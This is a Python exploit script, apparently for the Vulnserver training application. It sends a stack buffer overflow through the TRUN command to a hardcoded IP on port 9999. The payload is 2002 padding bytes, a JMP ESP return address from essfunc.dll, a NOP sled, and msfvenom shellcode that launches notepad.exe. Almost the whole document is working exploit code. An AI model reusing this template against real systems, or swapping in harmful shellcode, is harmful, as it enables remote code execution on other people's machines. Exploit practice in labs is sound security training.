import socket
import os
import sys

host = "172.208.67.255"
port = 9999

# malicious shellcode generated by msfvenom --platform windows --arch x64 -p windows/x64/exec CMD=notepad.exe EXITFUNC=thread -b '\x00' -f python  
shellcode =  b""
shellcode += b"\xbf\x2f\xce\xb7\x62\xdb\xc1\xd9\x74\x24\xf4\x5d"
shellcode += b"\x2b\xc9\xb1\x32\x31\x7d\x12\x83\xed\xfc\x03\x52"
shellcode += b"\xc0\x55\x97\x50\x34\x1b\x58\xa8\xc5\x7c\xd0\x4d"
shellcode += b"\xf4\xbc\x86\x06\xa7\x0c\xcc\x4a\x44\xe6\x80\x7e"
shellcode += b"\xdf\x8a\x0c\x71\x68\x20\x6b\xbc\x69\x19\x4f\xdf"
shellcode += b"\xe9\x60\x9c\x3f\xd3\xaa\xd1\x3e\x14\xd6\x18\x12"
shellcode += b"\xcd\x9c\x8f\x82\x7a\xe8\x13\x29\x30\xfc\x13\xce"
shellcode += b"\x81\xff\x32\x41\x99\x59\x95\x60\x4e\xd2\x9c\x7a"
shellcode += b"\x93\xdf\x57\xf1\x67\xab\x69\xd3\xb9\x54\xc5\x1a"
shellcode += b"\x76\xa7\x17\x5b\xb1\x58\x62\x95\xc1\xe5\x75\x62"
shellcode += b"\xbb\x31\xf3\x70\x1b\xb1\xa3\x5c\x9d\x16\x35\x17"
shellcode += b"\x91\xd3\x31\x7f\xb6\xe2\x96\xf4\xc2\x6f\x19\xda"
shellcode += b"\x42\x2b\x3e\xfe\x0f\xef\x5f\xa7\xf5\x5e\x5f\xb7"
shellcode += b"\x55\x3e\xc5\xbc\x78\x2b\x74\x9f\x16\xaa\x0a\x9a"
shellcode += b"\x55\xac\x14\xa4\xc9\xc5\x25\x2f\x86\x92\xb9\xfa"
shellcode += b"\xe2\x7d\x58\x2e\x1f\x16\xc5\xbb\xa2\x7b\xf6\x16"
shellcode += b"\xe0\x85\x75\x92\x99\x71\x65\xd7\x9c\x3e\x21\x04"
shellcode += b"\xed\x2f\xc4\x2a\x42\x4f\xcd\x44\x0b\xdb\x8b\xe8"
shellcode += b"\xb2\x47\x7a\x6d\x4d\xed\x82"

nop = b"\x90" * 10
buffer = b"A" * 2002
buffer +=  b"\xAF\x11\x50\x62"        # 625011AF  JMP ESP from essfunc.dll
buffer += nop
buffer += shellcode
buffer += b"C" * (5000 - len(buffer))

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    print(s.recv(1024))
    payload = b"TRUN /.../" + buffer
    s.send(payload)
    print(s.recv(1024))
    s.close()

if __name__ == "__main__":
    main()